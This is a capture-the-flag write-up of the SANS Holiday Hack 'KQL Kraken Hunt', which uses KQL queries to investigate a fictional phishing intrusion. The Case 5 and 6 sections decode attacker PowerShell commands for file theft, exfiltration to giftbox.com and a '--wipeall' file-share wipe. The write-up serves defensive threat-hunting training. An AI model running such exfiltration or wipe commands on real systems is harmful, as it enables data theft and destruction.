# KQL Kraken Hunt

To start the challenge, go to the *Gumshoe Alley PI Office* on *Film Noir Island* and talk to *Tangle Coalbox*.

## Challenge Prompt

Once we enter the terminal, we are redirected to an IMAP mailbox at https://detective.kusto.io/inbox.

![Figure 1: Detective KQL Inbox](/img/kql-inbox.png)

There are some key takeaways:
* To login to our account, we must first provision a free Kusto cluster or KQL database; the URL of the cluster/database will be a confidential string identifying ourselves.
* To complete the challenge, we must determine the number of Craftsperson Elf's in the organization that are working from laptops.
* To populate our cluster/database with the data required to complete the challenge, we must run the script provided at the bottom of the message in our console.
* The [FAQ section] contains the instructions for creating a free personal cluster.

![Figure 2: FAW Cluster Creation Instructions](/img/kql-faq.png)

## Creating a Cluster

The first step in creating a KQL cluster is provisioning a Microsoft account, which I have done already. Next, we navigate to https://aka.ms/kustofree and follow the directions in the prompt to create a cluster.

![Figure 3: Creating a KQL Cluster](/img/kql-create-cluster.png)

Navigating to the *My cluster* tab, we copy the contents of the *Cluster URI* field to our clipboard.

![Figure 4: KQL Cluster Details](/img/kql-cluster-details.png)

Return back to the Kusto inbox and click the *Log in* page at the top right corner of the screen, and paste the contents of the clipboard into the *Cluster URL* box. 

![Figure 5: Kusto KQL Login](/img/kql-login.png)

## Preparing the Challenge

Now that we are logged in and our progress is being tracked, we can populate the KQL database. For this challenge I used the *Azure Data Explorer Web UI*[^A], but other tools like *Real-Time Analytics KQL Queryset*[^B] or *Kusto Explorer*[^C] should also be acceptable.

Once you have accessed the web UI of your choice, execute the provided script.

![Figure 6: Populating the KQL Database](/img/kql-initialize-database.png)

## Challenge Cases

### Introduction Prompt

![Figure 7: KQL First Question](/img/kql-first-question.png)

1. How many Craftperson Elf's are working from laptops?

The following query selects all data from the `Employees` table, filters the results to only include those entries where the `role` column value is exactly `Craftsperson Elf` and the hostname contains the substring `LAPTOP`, then finally counts all the returned rows.

```
Employees
| where role == 'Craftsperson Elf' and hostname has 'LAPTOP'
| count
```

![Figure 8: Determining the Number of Craftperson Elf Working from Laptops](/img/kql-first-query.png)

The answer is `25`.

![Figure 9: Submitting the First Answer](/img/kql-first-answer.png)

### Case 1

![Figure 10: Case 1 Questions](/img/kql-case-1-questions.png)

1. What is the email address of the employee who received this phishing email?
2. What is the email address that was used to send this spear phishing email?
3. What was the subject line used in the spear phishing email?

The following query selects all data from the `Email` table, filters the results to only those entries where the `link` column value is exactly `http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx`, then only include the columns of interest (`recipient`, `sender`, and `subject`). 

```
Email
| where link == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
| project recipient,sender,subject
```

![Figure 11: Case 1 KQL Query](/img/kql-case-1-query.png)

The answers are `alabaster_snowball@santaworkshopgeeseislands.org`, `cwombley@gmail.com`, and `[EXTERNAL] Invoice foir reindeer food past due`.

![Figure 12: Submitting Case 1 Answers](/img/kql-case-1-answers.png)

### Case 2

![Figure 13: Case 2 Questions](/img/kql-case-2-questions.png)

1. What is the role of our victim in the organization?
2. What is the hostname of the victim's machine?
3. What is the source IP linked to the victim?

The following query selects all data from the `Employees` table, filters the results to only those entries where the `email_add` column value is exactly `alabaster_snowball@santaworkshopgeeseislands.org`, then only include the columns of interest (`role`, `hostname`, and `ip_addr`.

```
Employees
| where email_addr == 'alabaster_snowball@santaworkshopgeeseislands.org'
| project role,hostname,ip_addr
```

![Figure 14: Case 2 Query](/img/kql-case-2-query.png)

The answers are `Head Elf`, `Y1US-DESKTOP`, and `10.10.0.4`.

![Figure 15: Submitting Case 2 Answers](/img/kql-case-2-answers.png)

### Case 3

![Figure 16: Case 3 Questions](/img/kql-case-3-questions.png)

1. What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!
2. What file is dropped to Alabaster's machine shortly after he downloads the malicious file?

To answer this question, we will run 2 queries. The first query selects all data from the `OutboundNetworkEvents` table, filters the results to only those entries where the `url` is exactly `http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx`, then only include the `timestamp` column.

```
OutboundNetworkEvents
| where url == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
| project timestamp
```

![Figure 17: Case 3 Queries (1)](/img/kql-case-3-query-1.png)

The second query selects all data from the `FileCreationEvents` table, filters the results to only those entries where the `hostname` is exactly `Y1US-DESKTOP` and the `timestamp` value is after `2023-12-02T10:12:42Z`, sorts the value in ascending `timestamp` order, then only includes the `filename` column.

```
FileCreationEvents
| where hostname == 'Y1US-DESKTOP'
| where timestamp >= datetime(2023-12-02T10:12:42Z)
| sort by timestamp asc 
| project filename
```

![Figure 18: Case 3 Queries (2)](/img/kql-case-3-query-2.png)

The answers are `2023-12-02T10:12:42Z` and `garden.jpeg`.

![Figure 19: Case 3 Answers](/img/kql-case-3-answers.png)

### Case 4

![Figure 20: Case 4 Questions](/img/kql-case-4-questions.png)

1. The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?
2. What is the timestamp when the attackers enumerated network shares on the machine?
3. What was the hostname of the system the attacker moved laterally to?

Let's consider what utilities an attacker would likely use in this scenario. In the first question, the attacker creates a reverse tunnel connection. One of the most versatile tunneling tools available for free on the Internet is Ligolo-ng, so we could start by searching for any commands containing the substring `ligolo`. 

The `net share` utility for Windows servers searches for all shared network resources on the given host. We should therefore also look for usage of `net` in our query.

The following query selects all data from the `ProcessEvents` table, filters the results to only those entries where the `hostname` is exactly `Y1US-DESKTOP`, the `timestamp` value is after `2023-12-02T10:12:42Z`, and the `process_comomandline` value contains either `ligolo` or `net`. Finally, the query only includes the `timestamp` and `process_commandline` columns.

```
ProcessEvents
| where hostname == 'Y1US-DESKTOP'
| where timestamp >= datetime(2023-12-02T10:12:42Z)
| where process_commandline has 'ligolo' or process_commandline has 'net'
| project timestamp,process_commandline
```

![Figure 21: Case 4 Query](/img/kql-case-4-query.png)

The answers are `113.37.9.17`, `2023-12-02T16:51:44Z`, and `NorthPolefileshare`.

![Figure 22: Case 4 Answers](/img/kql-case-4-answers.png)

### Case 5

![Figure 21: Case 5 Questions](/img/kql-case-5-questions.png)

1. When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?
2. What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)
3. The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?

This case will require a little bit of base64 decoding. Since we know that the attacker issued encoded commands in PowerShell, we can assume that the commands would contain the string `powershell` and the command-line option to specify base64 encoded commands (`-enc`), and format our query appropriately.

The following query selects all data from the `ProcessEvents` table, filters the results to only those entries where the `hostname` is exactly `Y1US-DESKTOP`, the `timestamp` value is after `2023-12-02T10:12:42Z`, and the `process_comomandline` value contains the substrings `powershell` and `-enc`. The data is ordered in ascending order by the `timestamp` value, and only the `timestamp` and `process_commandline` columns are included.

```
ProcessEvents
| where hostname == "Y1US-DESKTOP"
| where timestamp >= todatetime("2023-12-02T10:12:42Z")
| where process_commandline has 'powershell' and process_commandline has '-enc'
| order by timestamp asc
| project timestamp,process_commandline
```

![Figure 21: Case 5 Query](/img/kql-case-5-query.png)

As expected, there are multiple base64 encoded PowerShell commands in the query results. Next, we should open a PowerShell terminal or emulator and begin decrypting the commands, starting with the command from timestamp `2023-12-24T16:07:47Z`.

```powershell
$bytes = [Convert]::FromBase64String('KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn')

-join ($bytes -as [char[]])
```

![Figure 22: Case 5 PowerShell Emulator (2)](/img/kql-case-5-pwsh-1.png)

The attacker seems to have manually reversed the command they want to send, then issued a PowerShell one-liner to reformat the string and pass to the `powershell.exe` utility. To decode this string, we will assign it to a variable and issue a PowerShell one-liner of our own.

```powershell
$decoding = -join ($bytes -as [char[]])

$decoding[-1..-$decoding.Length] -join ''
```

![Figure 23: Case 5 PowerShell Emulator (2)](/img/kql-case-5-pwsh-3.png)

We have revealed the name of the exfiltrated file to be `NaughtyNiceList.txt`. Next, let's decode the command issued from timestamp `2023-12-24T16:58:43Z`.

```powershell
$bytes = [Convert]::FromBase64String('W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSgxMDAsIDExMSwgMTE5LCAxMTAsIDExOSwgMTA1LCAxMTYsIDEwNCwgMTE1LCA5NywgMTEwLCAxMTYsIDk3LCA0NiwgMTAxLCAxMjAsIDEwMSwgMzIsIDQ1LCAxMDEsIDEyMCwgMTAyLCAxMDUsIDEwOCwgMzIsIDY3LCA1OCwgOTIsIDkyLCA2OCwgMTAxLCAxMTUsIDEwNywgMTE2LCAxMTEsIDExMiwgOTIsIDkyLCA3OCwgOTcsIDExNywgMTAzLCAxMDQsIDExNiwgNzgsIDEwNSwgOTksIDEwMSwgNzYsIDEwNSwgMTE1LCAxMTYsIDQ2LCAxMDAsIDExMSwgOTksIDEyMCwgMzIsIDkyLCA5MiwgMTAzLCAxMDUsIDEwMiwgMTE2LCA5OCwgMTExLCAxMjAsIDQ2LCA5OSwgMTExLCAxMDksIDkyLCAxMDIsIDEwNSwgMTA4LCAxMDEpKXwmICgoZ3YgJypNRHIqJykuTmFtRVszLDExLDJdLWpvaU4=')

-join ($bytes -as [char[]])
```

![Figure 24: Case 5 PowerShell Emulator (3)](/img/kql-case-5-pwsh-3.png)

The attacker seems to have mnaully encoded the command they want to send in ASCII format, then issued a PowerShell one-liner to reformat the string and pass to the `powershell.exe` utility. Rather than decode this in PowerShell, let's ask ChatGPT to validate this hypotheses.

![Figure 25: ChatGPT Identifying an Encoding Scheme](/img/kql-chatgpt.png)

ChatGPT even goes one step further in identifying the encoding scheme and attempts to decode the cipher for us.

> *Note*:
> ChatGPT seems to have made a mistake here. It identifies the domain as `giftox.com`, but if we had manually run the PowerShell one-liner `$([Char[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101)) -join ''`, we would confirm that the domain is actually `giftbox.com`.

The answers are `2023-12-24T16:07:47Z`, `NaughtyNiceList.txt`, and `giftbox.com`

![Figure 26: Case 5 Answers](/img/kql-case-5-answers.png)

### Case 6

![Figure 27: Case 6 Questions](/img/kql-case-6-questions.png)

1. What is the name of the executable the attackers used in the final malicious command?
2. What was the command line flag used alongside this executable?

We can use the results of our previous query to answer this question. Copy the encoded command from timestamp `2023-12-25T10:44:27Z` and decode it in a PowerShell terminal/emulator.

```powershell
$bytes = [Convert]::FromBase64String('QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ=')

-join ($bytes -as [char[]])
```

![Figure 28: Case 6 PowerShell Emulator](/img/kql-case-6-pwsh.png)

The answers are `downwithsanta.exe` and `--wipeall`.

![Figure 29: Case 5 Answers](/img/kql-case-6-answers.png)

## Completing the Challenge

Once we have entered the final flag, we are prompted to run a final script to reveal the secret phrase required to mark the challenge as completed in the SANS Holiday Hack Challenge.

![Figure 30: KQL Final Prompt](/img/kql-final-prompt.png)

Run the command in the web UI to decode the ciphertext.

![Figure 31: Decoded Solution](/img/kql-final-query.png)

[^A]: https://dataexplorer.azure.com/
[^B]: https://aka.ms/fabrickqlqueryset
[^C]: https://aka.ms/ke
